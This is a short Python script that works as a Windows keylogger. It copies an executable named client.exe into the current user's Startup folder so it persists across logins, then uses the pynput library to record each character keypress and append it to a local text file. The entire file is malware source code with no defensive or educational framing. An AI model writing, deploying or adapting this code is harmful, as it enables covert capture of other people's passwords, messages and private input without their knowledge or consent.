import os
import shutil
from pynput import keyboard

file_location = os.getcwd()
user = os.getlogin()
file_is_open = False
text_file_name = file_location + "\textfile.txt"
des = "C:\\Users\\" + str(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.exe"
path = str(file_location) + "\client.exe"

try:
    if os.path.exists(des):
        print("File exists")
    else:
        shutil.copy(path, des)
except:
    print("[FAILED] File could not find...")

while True:
    def on_press(key):
        try:
            k = key.char
        except:
            k = ""
        print('Key pressed: ' + k)
        with open("textfile.txt", "a") as file:
            file.write(k)


    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()